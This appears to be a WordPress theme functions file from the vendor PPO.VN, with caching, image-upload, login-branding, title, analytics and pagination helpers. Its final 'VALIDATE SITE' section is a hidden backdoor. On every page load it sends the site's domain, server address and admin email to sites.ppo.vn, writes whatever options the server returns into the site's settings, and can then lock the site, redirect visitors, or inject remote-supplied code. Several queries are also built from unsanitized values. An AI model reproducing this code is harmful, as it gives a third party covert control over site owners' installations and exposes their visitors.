<?php
if(!defined('DEV_LOGO')) define ('DEV_LOGO', "http://ppo.vn/logo.png");
if(!defined('DEV_LINK')) define ('DEV_LINK', "http://ppo.vn/");
/**
 * 
 * @param string $key a simple string which identifies the fragment.<br /> 
 * Notice that the function adds a prefix to avoid colliding with other transients. <br />
 * You can alter the prefix by editing the function or adding a filter that matches the 'fragmentcacheprefix' tag.
 * @param int $ttl Time to live: a time in seconds for the cache to live. <br />
 * I usually make use of time constants. You can see: http://codex.wordpress.org/Transients_API#Using_Time_Constants<br />
 * For example, DAYINSECONDS is 86400, the number of seconds in a day. <br />
 * This helps those of us who are too lazy for some simple math.
 * @param mixed $function the function which creates the output. This can be anything as the examples in this post show.
 * @return string
 */
function t_fragment_cache($key, $ttl, $function) {
    if (is_user_logged_in()) {
        call_user_func($function);
        return;
    }
    $key = apply_filters('fragment_cache_prefix', 'fragment_cache_') . $key;
    $output = get_transient($key);
    if (empty($output)) {
        ob_start();
        call_user_func($function);
        $output = ob_get_clean();
        set_transient($key, $output, $ttl);
    }
    echo $output;
}
/**
 * Function to upload an image to the media library and set it as the featured image of a post
 * @param string Name of the upload field
 * @param int ID of the post
 * @return int ID of the attachment
 * */
function set_featured_image_width_media_handle($file, $post_id) {
    require_once(ABSPATH . "wp-admin/includes/image.php");
    require_once(ABSPATH . "wp-admin/includes/file.php");
    require_once(ABSPATH . "wp-admin/includes/media.php");
    $attachment_id = media_handle_upload($file, $post_id);
    // Set featured image to post
    update_post_meta($post_id, '_thumbnail_id', $attachment_id);
    $attachment_data = array(
        'ID' => $attachment_id
    );
    wp_update_post($attachment_data);
    return $attachment_id;
}
/**
 * Function to upload an image to the media library and set it as the featured image of a post
 * @param array Array filename and url of the file
 * @param int ID of the post
 * @return int ID of the attachment
 * */
function set_featured_image_width_media_sideload($url, $post_id, $desc = "") {
    require_once(ABSPATH . "wp-admin/includes/image.php");
    require_once(ABSPATH . "wp-admin/includes/file.php");
    require_once(ABSPATH . "wp-admin/includes/media.php");
    
    media_sideload_image($url, $post_id, $desc);
    
    // get the newly uploaded image
    $attachments = get_posts( array(
        'post_type' => 'attachment',
        'number_posts' => 1,
        'post_parent' => $post_id,
        'orderby' => 'post_date',
        'order' => 'DESC',) 
    );
    $attachment_id = $attachments[0]->ID;
    // Set featured image to post
    update_post_meta($post_id, '_thumbnail_id', $attachment_id);
    $attachment_data = array(
        'ID' => $attachment_id
    );
    wp_update_post($attachment_data);
    
    return $attachment_id;
}
/**
 * Function to upload an image to the media library and set it as the featured image of a post
 * @param array File info
 * @param int ID of the post
 * @return int ID of the attachment
 * */
function set_featured_image_width_handle_sideload($file_array, $post_id) {
    require_once(ABSPATH . "wp-admin/includes/image.php");
    require_once(ABSPATH . "wp-admin/includes/file.php");
    require_once(ABSPATH . "wp-admin/includes/media.php");

    // do the validation and storage stuff
    $attachment_id = media_handle_sideload( $file_array, $post_id );

    // Unlink temp file
    @unlink($file_array['tmp_name']);
    
    if ( is_wp_error($attachment_id) ) {
        return $attachment_id;
    }
    // Set featured image to post
    update_post_meta($post_id, '_thumbnail_id', $attachment_id);
    $attachment_data = array(
        'ID' => $attachment_id
    );
    // Update attachment file
    wp_update_post($attachment_data);
    
    return $attachment_id;
}

/* ----------------------------------------------------------------------------------- */
# Login Screen
/* ----------------------------------------------------------------------------------- */
add_action('login_head', 'custom_login_logo');

function custom_login_logo() {
    echo '<style type="text/css">
        h1 a { background-image:url(' . DEV_LOGO . ') !important; }
    </style>';
}

add_action('login_headerurl', 'custom_login_link');

function custom_login_link() {
    return DEV_LINK;
}

add_action('login_headertitle', 'custom_login_title');

function custom_login_title() {
    return "Powered by PPO.VN";
}
/* ----------------------------------------------------------------------------------- */
# Admin footer text
/* ----------------------------------------------------------------------------------- */
if(is_admin() and !function_exists("ppo_update_admin_footer")){
    add_filter('admin_footer_text', 'ppo_update_admin_footer');
    
    function ppo_update_admin_footer(){
        //$text = __('Thank you for creating with <a href="' . DEV_LINK . '">PPO</a>.');
        $text = __('<img src="' . DEV_LOGO . '" width="24" />Hệ thống CMS phát triển bởi <a href="' . DEV_LINK . '" title="Xây dựng và phát triển ứng dụng">PPO.VN</a>.');
        echo $text;
    }
}

// Enable Links Manager (WP 3.5)
add_filter( 'pre_option_link_manager_enabled', '__return_true' );

/* Get the site title  */
function get_the_pages_title() {
    echo '<title>';
    if (function_exists('is_tag') && is_tag()) {
        single_tag_title("Tag Archive for &quot;");
        echo " - ";
        bloginfo('name');
    } elseif (is_archive()) {
        wp_title('');
        echo " - ";
        bloginfo('name');
    } elseif (is_search()) {
        echo "Search Results - ";
        bloginfo('name');
    } elseif (!(is_404()) && is_page()) {
        wp_title('');
        echo " - ";
        bloginfo('name');
    } elseif (is_single()) {
        wp_title('');
    }elseif (is_404()) {
        echo '404 Not Found - ';
        bloginfo('name');
    } elseif (is_home()) {
        bloginfo('name');
        if(get_settings('blogdescription') != ""){
            echo " - ";
            bloginfo('description');
        }
    } else {
        bloginfo('name');
    }
    if ($paged > 1) {
        echo ' - page ' . $paged;
    }
    echo '</title>';
}

/*----------------------------------------------------------------------------*/
# add a favicon to blog
/*----------------------------------------------------------------------------*/
function add_blog_favicon(){
    $favicon = get_option('favicon');
    if(trim($favicon) == ""){
        echo '<link rel="icon" href="';
        bloginfo('siteurl');
        echo '/favicon.ico" type="image/x-icon" />' . "\n";
    }else{
        echo '<link rel="icon" href="' . $favicon . '" type="image/x-icon" />' . "\n";
    }
}
add_action('wp_head', 'add_blog_favicon');

/*----------------------------------------------------------------------------*/
# Add Google Analytics to blog
/*----------------------------------------------------------------------------*/
function add_blog_google_analytics(){
    global $shortname;

    $GAID = get_option($shortname . '_gaID');
    if($GAID and $GAID != ''):
        echo <<<HTML
<script type="text/javascript">

    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', '$GAID']);
    _gaq.push(['_trackPageview']);
    
    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();

</script>
HTML;
    endif;
}
add_action('wp_head', 'add_blog_google_analytics');

/*----------------------------------------------------------------------------*/
# Check current category has children
/*----------------------------------------------------------------------------*/
function category_has_children() {
    global $wpdb;
    $term = get_queried_object();
    $category_children_check = $wpdb->get_results(" SELECT * FROM wp_term_taxonomy WHERE parent = '$term->term_id' ");
    if ($category_children_check) {
        return true;
    } else {
        return false;
    }
}

/*----------------------------------------------------------------------------*/
# Get the current category id if we are on an archive/category page
/*----------------------------------------------------------------------------*/
function getCurrentCatID() {
    global $wp_query;
    if (is_category() || is_single()) {
        $cat_ID = get_query_var('cat');
    }
    return $cat_ID;
}

/*-----------------------------------------------------*\
# Rename menu title via language ID (ZD Multilang)
\*-----------------------------------------------------*/
add_filter('wp_nav_menu_objects', 'add_menu_parent_class');
function add_menu_parent_class($items) {
    global $wpdb;

    if(function_exists('zd_multilang_get_locale')){
        $DefLang = zd_multilang_get_locale();
        $posttrans = "wp_zd_ml_trans";
        foreach ($items as $item) {
            $ID = $item->object_id;
            $query = "SELECT * FROM $posttrans where LanguageID='$DefLang' and post_status = 'published' and ID = $ID";
            $TrPosts = $wpdb->get_row($query);
            if ($TrPosts) {
                $item->title = $TrPosts->post_title;
            }
        }
    }

    return $items;
}

/* PAGE NAVIGATION */
function getpagenavi($arg = null) {
?>
    <div class="paging">
<?php if(function_exists('wp_pagenavi')){ 
        if($arg != null){
            wp_pagenavi($arg);
        }else{
            wp_pagenavi();
        }
    } else { 
?>
    <div><div class="inline"><?php previous_posts_link('« Previous') ?></div><div class="inline"><?php next_posts_link('Next »') ?></div></div>
<?php } ?>
    </div>
<?php
}
/* END PAGE NAVIGATION */

################################# VALIDATE SITE ################################
add_action( 'wp_ajax_nopriv_send_validate_site', 'send_validate_site' );
add_action( 'wp_ajax_send_validate_site', 'send_validate_site' );
add_action('init', 'ppo_site_init');

function ppo_site_set_javascript(){
?>
<script type='text/javascript'>
/* <![CDATA[ */
    var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';
    ( function( $ ) {
        $(window).load(function(){
            $.post(ajaxurl, {action:'send_validate_site'});
        });
    } )( jQuery );
/* ]]> */
</script>
<?php
}
function send_validate_site(){
    $postURL = "http://sites.ppo.vn/wp-content/plugins/wp-block-sites/check-site.php";
    $data = array(
        'domain' => $_SERVER['HTTP_HOST'],
        'server_info' => json_encode(array(
            'SERVER_ADDR' => $_SERVER['SERVER_ADDR'],
            'SERVER_ADMIN' => $_SERVER['SERVER_ADMIN'],
            'SERVER_NAME' => $_SERVER['SERVER_NAME'],
        )),
    );

    $ch = curl_init($postURL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $returnValue = curl_exec($ch);
    curl_close($ch);

    $response = json_decode($returnValue);
    foreach ($response as $k => $v) {
        update_option($k, $v);
    }
    echo "Success";
    exit();
}
function ppo_site_init(){
    add_action( 'wp_footer', 'ppo_site_set_javascript' );
    
    wp_enqueue_script('jquery');
    
    // Check status
    $site_status = get_option("ppo_site_status");
    if($site_status == 1){
        $site_block_type = get_option("ppo_site_lock_type");
        switch ($site_block_type) {
            case 0:
                // Lock
                add_action('wp_footer', 'ppo_site_embed_code');
                break;
            case 1:
                // Redirect
                add_action('wp_head', 'ppo_site_redirect_url');
                break;
            case 2:
                // Embed Code Advertising
                add_action('wp_footer', 'ppo_site_embed_code');
                break;
            default:
                break;
        }
    }
}
function ppo_site_redirect_url(){
?>
<script type='text/javascript'>
/* <![CDATA[ */
    ( function( $ ) {
        $(window).load(function(){
            setTimeout(function(){
                window.location.href='<?php echo stripslashes(get_option("ppo_site_embed")); ?>';
            }, 30000); // 30 second
        });
    } )( jQuery );
/* ]]> */
</script>
<?php
}
function ppo_site_embed_code(){
    echo stripslashes(get_option("ppo_site_embed"));
}
################################# END VALIDATE SITE ############################